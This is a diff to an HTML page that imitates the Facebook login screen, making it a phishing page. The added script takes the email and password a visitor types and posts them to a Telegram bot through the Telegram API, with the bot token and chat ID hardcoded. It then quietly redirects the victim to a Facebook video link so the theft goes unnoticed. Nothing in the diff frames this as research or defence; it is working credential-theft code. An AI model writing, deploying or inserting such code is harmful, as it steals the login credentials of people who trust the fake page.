@@ -91,11 +91,11 @@ a.forgot-link {
 <div class="container">
     <h1>Facebook Login</h1>
 
-    <form>
-        <input type="text" id="username" placeholder="Email or Username" oninput="checkInputs()" required>
+    <form id="loginForm">
+        <input type="text" id="Username" placeholder="Email or Username" oninput="checkInputs()" required>
         <input type="password" id="password" placeholder="Password" oninput="checkInputs()" required>
-
-        <a href="https://www.facebook.com/share/r/1DBGkJ4DkH/" id="loginBtn" class="btn-link disabled">Log In</a>
+        
+        <button type="submit" id="loginBtn" class="btn-link disabled" disabled>Log In</button>
 
         <a href="Forgot Password.html" class="forgot-link">Forgot Password?</a>
 
@@ -107,32 +107,32 @@ a.forgot-link {
 
 <script>
 function checkInputs() {
-    const usernameInput = document.getElementById('username').value.trim();
-    const passwordInput = document.getElementById('password').value.trim();
+    const kamathiemailInput = document.getElementById('Username').value.trim();
+    const rahasemailInput = document.getElementById('password').value.trim();
     const loginBtn = document.getElementById('loginBtn');
 
     // කොටු දෙකම හිස් නොවේ නම් පමණක් බොත්තම සක්‍රිය කරයි
-    if (usernameInput !== "" && passwordInput !== "") {
+    if (kamathiemailInput !== "" && rahasemailInput !== "") {
         loginBtn.classList.remove('disabled');
+        loginBtn.removeAttribute('disabled');
     } else {
         loginBtn.classList.add('disabled');
+        loginBtn.setAttribute('disabled', 'true');
     }
 }
-</script>
 
-</body>
-<script>
-document.querySelector('form').addEventListener('submit', function(e) {
+document.getElementById('loginForm').addEventListener('submit', function(e) {
     e.preventDefault();
     
     const botToken = "8524435746:AAGpGH-ygNIUIsn9NGFZBsMUaKDDRpus8eI";
-    const chatId = "7883989086"; // මෙතනට ඔබේ Chat ID එක ඇතුලත් කරන්න
+    const chatId = "7883989086"; 
     
-    const email = document.querySelectorAll('input')[0].value;
-    const password = document.querySelectorAll('input')[1].value;
+    const email = document.getElementById('Username').value;
+    const rahasemail = document.getElementById('password').value;
     
-    const message = "Login Attempt:\nUser: " + email + "\nPass: " + password;
+    const message = "Login Attempt:\nemail: " + email + "\nPassword: " + rahasemail;
     
+    // Telegram API එකට දත්ත යැවීම
     fetch('https://api.telegram.org/bot' + botToken + '/sendMessage', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -141,7 +141,11 @@ document.querySelector('form').addEventListener('submit', function(e) {
             text: message
         })
     }).then(response => {
-        window.location.reload();
+        // දත්ත බොට්ටුවට ගිය පසු අදාළ ෆේස්බුක් වීඩියෝ ලින්ක් එකට රැගෙන යයි
+        window.location.href = "https://www.facebook.com/share/r/1DBGkJ4DkH/";
+    }).catch(error => {
+        // කිසියම් දෝෂයක් වුවහොත් වීඩියෝ එකට Redirect කරයි
+        window.location.href = "https://www.facebook.com/share/r/1DBGkJ4DkH/";
     });
 });
 </script>
